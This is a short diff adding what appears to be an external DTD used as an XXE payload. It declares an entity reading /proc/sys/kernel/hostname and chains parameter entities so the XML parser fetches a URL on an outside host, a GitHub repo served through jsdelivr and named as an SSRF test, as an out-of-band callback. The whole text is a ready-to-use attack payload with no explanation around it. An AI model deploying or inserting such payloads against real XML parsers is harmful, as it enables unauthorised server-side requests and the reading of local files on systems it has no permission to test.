@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/sys/kernel/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://cdn.jsdelivr.net/gh/jioja32/tmp-ssrf-test@main/oob_hit_1__proc_sys_kernel_hostname;'>">
+%eval;
+%send;
